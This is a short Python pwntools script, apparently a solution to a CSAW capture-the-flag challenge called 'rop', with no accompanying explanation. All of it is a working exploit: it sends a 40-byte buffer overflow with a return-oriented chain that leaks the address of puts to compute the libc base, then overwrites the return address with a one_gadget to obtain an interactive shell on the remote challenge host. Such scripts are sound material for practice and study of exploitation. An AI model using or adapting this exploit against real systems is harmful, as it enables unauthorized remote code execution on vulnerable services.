#!/usr/bin/env python
from pwn import *


def main():
    # conn = process("rop")
    conn = remote('pwn.chal.csaw.io', 5016)
    elf = ELF("./rop")
    libc = ELF("./libc-2.27.so")
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  # local
    one_gadget = [0x4f365, 0x4f3c2, 0x10a45c]

    payload = 'A' * 40
    payload += p64(0x400683)
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(0x4005dc)

    conn.sendline(payload)

    print(conn.recvline())
    libc_base = u64(conn.recv(6) + "\x00\x00") - libc.symbols['puts']
    print("libc_base: " + hex(libc_base))

    payload = 'A' * 40
    payload += p64(libc_base + one_gadget[0])
    payload += p64(0xdeadbeef)

    conn.sendline(payload)
    conn.interactive()


if __name__ == "__main__":
    main()
